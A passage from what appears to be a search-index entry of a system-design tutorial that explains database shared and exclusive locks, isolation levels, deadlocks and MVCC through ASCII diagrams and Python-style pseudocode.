\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Lock Compatibility Matrix:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502          LOCK COMPATIBILITY MATRIX                      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Current Lock    \u2502  Shared (S)  \u2502  Exclusive (X)        \u2502\n\u2502 on Resource     \u2502              \u2502                       \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500        \u2502\n\u2502 Request         \u2502              \u2502                       \u2502\n\u2502 Shared (S)      \u2502      \u2713       \u2502       \u2717               \u2502\n\u2502                 \u2502  (Compatible)\u2502   (Blocked)           \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500        \u2502\n\u2502 Request         \u2502              \u2502                       \u2502\n\u2502 Exclusive (X)   \u2502      \u2717       \u2502       \u2717               \u2502\n\u2502                 \u2502  (Blocked)   \u2502   (Blocked)           \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500        \u2502\n\u2502                                                         \u2502\n\u2502 \u2713 Compatible: Lock granted immediately                 \u2502\n\u2502 \u2717 Blocked: Transaction must wait                       \u2502\n\u2502                                                         \u2502\n\u2502 Key Rules:                                              \u2502\n\u2502 \u2022 Shared + Shared = \u2713 (Multiple readers allowed)       \u2502\n\u2502 \u2022 Shared + Exclusive = \u2717 (Reader blocks writer)        \u2502\n\u2502 \u2022 Exclusive + Shared = \u2717 (Writer blocks reader)        \u2502\n\u2502 \u2022 Exclusive + Exclusive = \u2717 (Writer blocks writer)     \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Visual Diagram - Lock Interactions:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         SHARED LOCKS - Multiple Readers                 \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Transaction 1    Transaction 2    Transaction 3       \u2502\n\u2502       \u2502                \u2502                 \u2502             \u2502\n\u2502       \u251c\u2500 READ row 1    \u2502                 \u2502             \u2502\n\u2502       \u2502  (Shared Lock) \u2502                 \u2502             \u2502\n\u2502       \u2502      \ud83d\udd13        \u2502                 \u2502             \u2502\n\u2502       \u2502                \u251c\u2500 READ row 1     \u2502             \u2502\n\u2502       \u2502                \u2502  (Shared Lock)  \u2502             \u2502\n\u2502       \u2502      \ud83d\udd13       \ud83d\udd13                 \u2502             \u2502\n\u2502       \u2502                \u2502                 \u251c\u2500 READ row 1  \u2502\n\u2502       \u2502                \u2502                 \u2502  (Shared)    \u2502\n\u2502       \u2502      \ud83d\udd13       \ud83d\udd13        \ud83d\udd13      \u2502             \u2502\n\u2502       \u2502                \u2502                 \u2502             \u2502\n\u2502       \u2514\u2500 All can read simultaneously \u2713                 \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       EXCLUSIVE LOCK - Single Writer Blocks All         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Transaction 1    Transaction 2    Transaction 3       \u2502\n\u2502       \u2502                \u2502                 \u2502             \u2502\n\u2502       \u251c\u2500 UPDATE row 1  \u2502                 \u2502             \u2502\n\u2502       \u2502  (Exclusive)   \u2502                 \u2502             \u2502\n\u2502       \u2502      \ud83d\udd12        \u2502                 \u2502             \u2502\n\u2502       \u2502                \u251c\u2500 READ row 1     \u2502             \u2502\n\u2502       \u2502                \u2502  \u274c BLOCKED!    \u2502             \u2502\n\u2502       \u2502                \u2502  [waiting...]   \u2502             \u2502\n\u2502       \u2502      \ud83d\udd12        \u2502                 \u251c\u2500 UPDATE row 1\u2502\n\u2502       \u2502                \u2502                 \u2502  \u274c BLOCKED! \u2502\n\u2502       \u2502                \u2502                 \u2502  [waiting...] \u2502\n\u2502       \u2502      \ud83d\udd12        \u2502                 \u2502             \u2502\n\u2502       \u251c\u2500 COMMIT       \u2502                 \u2502             \u2502\n\u2502       \u2502  (Release)     \u2502                 \u2502             \u2502\n\u2502       \u2502      \ud83d\udd13        \u2502                 \u2502             \u2502\n\u2502       \u2502                \u251c\u2500 \u2713 Unblocked   \u2502             \u2502\n\u2502       \u2502                \u2502  READ succeeds  \u2502             \u2502\n\u2502       \u2502                \u2502                 \u2502             \u2502\n\u2502                                                         \u2502\n\u2502  Writer blocks ALL (readers and other writers)          \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>How Locks Prevent Isolation Problems:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   LOCKS vs ISOLATION PROBLEMS                           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. Preventing DIRTY READS:                              \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 Problem: Reading uncommitted data          \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Solution: Shared locks wait for exclusive \u2502         \u2502\n\u2502 \u2502          locks to be released              \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 T1: UPDATE row (Exclusive lock) \ud83d\udd12        \u2502         \u2502\n\u2502 \u2502 T2: READ row                               \u2502         \u2502\n\u2502 \u2502     \u2192 Requests Shared lock                 \u2502         \u2502\n\u2502 \u2502     \u2192 BLOCKED by T1's Exclusive lock \u274c   \u2502         \u2502\n\u2502 \u2502     \u2192 Waits for T1 to COMMIT/ROLLBACK     \u2502         \u2502\n\u2502 \u2502 T1: COMMIT (Release lock) \ud83d\udd13              \u2502         \u2502\n\u2502 \u2502 T2: Acquires Shared lock \u2713                \u2502         \u2502\n\u2502 \u2502     Reads COMMITTED data only              \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Used in: READ COMMITTED and higher         \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 2. Preventing NON-REPEATABLE READS:                     \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 Problem: Same row, different values        \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Solution: Hold shared locks until commit   \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 T1: READ row (Shared lock) \ud83d\udd13             \u2502         \u2502\n\u2502 \u2502     \u2192 HOLDS lock (not released!)           \u2502         \u2502\n\u2502 \u2502 T2: UPDATE same row                        \u2502         \u2502\n\u2502 \u2502     \u2192 Requests Exclusive lock              \u2502         \u2502\n\u2502 \u2502     \u2192 BLOCKED by T1's Shared lock \u274c      \u2502         \u2502\n\u2502 \u2502 T1: READ row again \ud83d\udd13                     \u2502         \u2502\n\u2502 \u2502     \u2192 Same value (no changes allowed)      \u2502         \u2502\n\u2502 \u2502 T1: COMMIT (Release lock) \ud83d\udd13              \u2502         \u2502\n\u2502 \u2502 T2: Acquires Exclusive lock \u2713             \u2502         \u2502\n\u2502 \u2502     Now can update                         \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Used in: REPEATABLE READ and higher        \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 3. Preventing PHANTOM READS:                            \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 Problem: New rows appearing in results     \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Solution: Range/Gap locks (not just rows)  \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 T1: SELECT WHERE age &gt; 25                  \u2502         \u2502\n\u2502 \u2502     \u2192 Shared locks on matching rows        \u2502         \u2502\n\u2502 \u2502     \u2192 Range lock on \"age &gt; 25\" range       \u2502         \u2502\n\u2502 \u2502     \u2192 Gap locks between rows               \u2502         \u2502\n\u2502 \u2502 T2: INSERT row with age=30                 \u2502         \u2502\n\u2502 \u2502     \u2192 Requests lock in locked range        \u2502         \u2502\n\u2502 \u2502     \u2192 BLOCKED by T1's Range lock \u274c       \u2502         \u2502\n\u2502 \u2502 T1: SELECT again                           \u2502         \u2502\n\u2502 \u2502     \u2192 Same rows (no inserts allowed)       \u2502         \u2502\n\u2502 \u2502 T1: COMMIT (Release locks)                 \u2502         \u2502\n\u2502 \u2502 T2: Insert succeeds \u2713                     \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Used in: SERIALIZABLE only                 \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Lock Usage in Isolation Levels:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502      ISOLATION LEVELS - LOCK STRATEGIES                 \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 READ UNCOMMITTED:                                       \u2502\n\u2502 \u251c\u2500 READ:  NO locks \u274c                                  \u2502\n\u2502 \u251c\u2500 WRITE: Exclusive locks (held until commit)          \u2502\n\u2502 \u2514\u2500 Result: Dirty reads allowed                         \u2502\n\u2502                                                         \u2502\n\u2502 READ COMMITTED:                                         \u2502\n\u2502 \u251c\u2500 READ:  Shared locks (released immediately)          \u2502\n\u2502 \u251c\u2500 WRITE: Exclusive locks (held until commit)          \u2502\n\u2502 \u2514\u2500 Result: No dirty reads, but non-repeatable reads OK \u2502\n\u2502                                                         \u2502\n\u2502 REPEATABLE READ:                                        \u2502\n\u2502 \u251c\u2500 READ:  Shared locks (held until commit)             \u2502\n\u2502 \u251c\u2500 WRITE: Exclusive locks (held until commit)          \u2502\n\u2502 \u2514\u2500 Result: No dirty/non-repeatable, but phantoms OK    \u2502\n\u2502                                                         \u2502\n\u2502 SERIALIZABLE:                                           \u2502\n\u2502 \u251c\u2500 READ:  Shared locks + Range locks (until commit)    \u2502\n\u2502 \u251c\u2500 WRITE: Exclusive locks + Gap locks (until commit)   \u2502\n\u2502 \u2514\u2500 Result: No anomalies (strict isolation)             \u2502\n\u2502                                                         \u2502\n\u2502 Lock Duration Progression:                              \u2502\n\u2502 None \u2192 Short \u2192 Long \u2192 Long+Range                       \u2502\n\u2502   \u2191      \u2191      \u2191         \u2191                            \u2502\n\u2502   RU     RC     RR        S                            \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Pseudo Code Examples:</p> <pre><code># Example 1: Shared Locks - Multiple Readers\n\ndef reader_transaction_1(db):\n    \"\"\"First reader acquires shared lock\"\"\"\n    db.begin()\n\n    # Acquire shared lock on row 1\n    result = db.execute(\n        \"SELECT balance FROM accounts WHERE id = 1 LOCK IN SHARE MODE\"\n    )\n    balance = result.fetchone()[0]\n    print(f\"T1 reads: {balance}\")  # e.g., $1000\n\n    # Shared lock held...\n    time.sleep(2)\n\n    db.commit()  # Release shared lock\n\n\ndef reader_transaction_2(db):\n    \"\"\"Second reader can also acquire shared lock\"\"\"\n    time.sleep(1)\n    db.begin()\n\n    # Can acquire shared lock (compatible with T1's shared lock!)\n    result = db.execute(\n        \"SELECT balance FROM accounts WHERE id = 1 LOCK IN SHARE MODE\"\n    )\n    balance = result.fetchone()[0]\n    print(f\"T2 reads: {balance}\")  # e.g., $1000 \u2713 (no blocking!)\n\n    db.commit()\n\n\n# Example 2: Exclusive Lock - Writer Blocks Readers\n\ndef writer_transaction(db):\n    \"\"\"Writer acquires exclusive lock\"\"\"\n    db.begin()\n\n    # Acquire exclusive lock\n    db.execute(\n        \"UPDATE accounts SET balance = 500 WHERE id = 1\"\n    )\n    print(\"T1 acquired exclusive lock\")\n\n    # Exclusive lock held...\n    time.sleep(2)\n\n    db.commit()  # Release exclusive lock\n\n\ndef reader_transaction_blocked(db):\n    \"\"\"Reader blocked by exclusive lock\"\"\"\n    time.sleep(1)\n    db.begin()\n\n    # Try to acquire shared lock\n    print(\"T2 requesting shared lock...\")\n    result = db.execute(\n        \"SELECT balance FROM accounts WHERE id = 1 LOCK IN SHARE MODE\"\n    )\n    # \u2191 BLOCKED here until T1 commits!\n\n    balance = result.fetchone()[0]\n    print(f\"T2 reads: {balance}\")  # Executes after T1 commits\n\n    db.commit()\n\n\n# Example 3: Preventing Dirty Read with Locks\n\ndef dirty_read_prevented(db):\n    \"\"\"How locks prevent dirty reads\"\"\"\n    db.set_isolation_level(\"READ COMMITTED\")\n    db.begin()\n\n    # READ COMMITTED acquires shared lock for reads\n    # This shared lock is INCOMPATIBLE with uncommitted exclusive locks\n\n    result = db.execute(\n        \"SELECT balance FROM accounts WHERE id = 1\"\n    )\n    # If another transaction has uncommitted UPDATE:\n    # - That transaction holds exclusive lock\n    # - Our shared lock request BLOCKS\n    # - We wait until exclusive lock released (commit/rollback)\n    # - Then we read COMMITTED data only\n\n    balance = result.fetchone()[0]\n    print(f\"Balance: {balance}\")  # Always committed value!\n\n    db.commit()\n\n\n# Example 4: Preventing Non-Repeatable Read with Locks\n\ndef non_repeatable_read_prevented(db):\n    \"\"\"How holding shared locks prevents non-repeatable reads\"\"\"\n    db.set_isolation_level(\"REPEATABLE READ\")\n    db.begin()\n\n    # First read - acquires shared lock and HOLDS it\n    result1 = db.execute(\n        \"SELECT balance FROM accounts WHERE id = 1\"\n    )\n    balance1 = result1.fetchone()[0]\n    print(f\"First read: {balance1}\")\n    # Shared lock STILL HELD (not released!)\n\n    time.sleep(2)\n    # Any UPDATE attempts blocked by our shared lock\n\n    # Second read - uses existing shared lock\n    result2 = db.execute(\n        \"SELECT balance FROM accounts WHERE id = 1\"\n    )\n    balance2 = result2.fetchone()[0]\n    print(f\"Second read: {balance2}\")\n\n    assert balance1 == balance2  # Guaranteed same!\n\n    db.commit()  # NOW release shared lock\n\n\n# Example 5: Lock Escalation and Deadlocks\n\ndef demonstrate_deadlock(db1, db2):\n    \"\"\"Deadlock from conflicting lock requests\"\"\"\n\n    # Transaction 1\n    def t1():\n        db1.begin()\n        # Acquire exclusive lock on row A\n        db1.execute(\"UPDATE accounts SET balance = 100 WHERE id = 'A'\")\n        print(\"T1: Locked row A\")\n\n        time.sleep(1)\n\n        # Try to lock row B (but T2 has it!)\n        print(\"T1: Requesting lock on row B...\")\n        db1.execute(\"UPDATE accounts SET balance = 200 WHERE id = 'B'\")\n        # \u2191 DEADLOCK! T1 waits for T2, T2 waits for T1\n\n        db1.commit()\n\n    # Transaction 2\n    def t2():\n        time.sleep(0.5)\n        db2.begin()\n        # Acquire exclusive lock on row B\n        db2.execute(\"UPDATE accounts SET balance = 300 WHERE id = 'B'\")\n        print(\"T2: Locked row B\")\n\n        time.sleep(1)\n\n        # Try to lock row A (but T1 has it!)\n        print(\"T2: Requesting lock on row A...\")\n        db2.execute(\"UPDATE accounts SET balance = 400 WHERE id = 'A'\")\n        # \u2191 DEADLOCK! Database detects cycle and aborts one transaction\n\n        db2.commit()\n\n    # Database detects deadlock and aborts one transaction:\n    # \"Deadlock detected. Transaction rolled back.\"\n\n\n# Example 6: Explicit Locking\n\ndef explicit_lock_usage(db):\n    \"\"\"Manual lock control\"\"\"\n    db.begin()\n\n    # Explicitly acquire shared lock\n    db.execute(\"SELECT * FROM accounts WHERE id = 1 LOCK IN SHARE MODE\")\n    # or: \"SELECT * FROM accounts WHERE id = 1 FOR SHARE\"\n\n    # Explicitly acquire exclusive lock\n    db.execute(\"SELECT * FROM accounts WHERE id = 2 FOR UPDATE\")\n    # Row 2 now exclusively locked\n\n    # No one can modify row 2 until we commit\n\n    db.commit()\n</code></pre> <p>Real-World Lock Timeline:</p> <pre><code>Example: Banking Transfer with Locks\n\nTime  T1 (Transfer)              Locks           T2 (Balance Check)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nt1    BEGIN                       -               \nt2    SELECT balance FROM A       S-lock(A) \ud83d\udd13   \n      \u2192 $1000                     \nt3                                                BEGIN\nt4                                S-lock(A) \ud83d\udd13   SELECT balance FROM A\n                                                  \u2192 $1000 \u2713 (shared OK)\nt5    UPDATE A SET bal=900        X-lock(A) \ud83d\udd12   \n      (releases S-lock,            \n       acquires X-lock)            \nt6                                X-lock(A) \ud83d\udd12   SELECT balance FROM A\n                                                  \u2192 BLOCKED! \u274c\nt7    UPDATE B SET bal=600        X-lock(B) \ud83d\udd12   [T2 waiting...]\nt8    COMMIT                      Release all \ud83d\udd13 \nt9                                -               \u2192 Reads $900 \u2713\n                                                  (committed value)\nt10                                               COMMIT\n\nKey Points:\n\u2022 t2: T1 acquires S-lock for read\n\u2022 t4: T2 can also get S-lock (compatible)\n\u2022 t5: T1 upgrades to X-lock for update\n\u2022 t6: T2 blocked by T1's X-lock (prevents dirty read)\n\u2022 t8: T1 commits, releases all locks\n\u2022 t9: T2 unblocked, reads committed data\n</code></pre> <p>Advantages of Lock-Based Concurrency Control: - \u2705 Prevents anomalies - dirty reads, non-repeatable reads, phantoms - \u2705 Ensures consistency - data integrity maintained - \u2705 Predictable behavior - well-understood semantics - \u2705 Fine-grained control - row-level, page-level, table-level locks</p> <p>Disadvantages: - \u274c Performance overhead - lock management cost - \u274c Blocking - transactions wait for locks - \u274c Deadlocks - circular wait conditions - \u274c Reduced concurrency - higher isolation = more blocking</p> <p>Alternative: MVCC (Multi-Version Concurrency Control):</p> <p>Many modern databases use MVCC instead of traditional locking for reads: - PostgreSQL: Uses MVCC for all isolation levels - MySQL InnoDB: Uses MVCC for READ COMMITTED and REPEATABLE READ - Oracle: MVCC-based, minimum isolation is READ COMMITTED</p> <p>MVCC Benefits: - Readers don't block writers - Writers don't block readers - No read locks needed - Better concurrency - Fewer deadlocks</p> <p>MVCC Trade-offs: - More complex implementation - Higher storage overhead (multiple versions) - Garbage collection needed for old versions</p>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#25-isolation-problems-vs-isolation-levels-summary-table","title":"2.5 Isolation Problems vs Isolation Levels - Summary Table","text":"<p>Description:</p> <p>This table provides a quick reference showing which isolation problems can occur at each isolation level. Understanding this matrix is crucial for choosing the right isolation level for your application.</p> <p>Isolation Problems Matrix:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           ISOLATION PROBLEMS vs ISOLATION LEVELS                            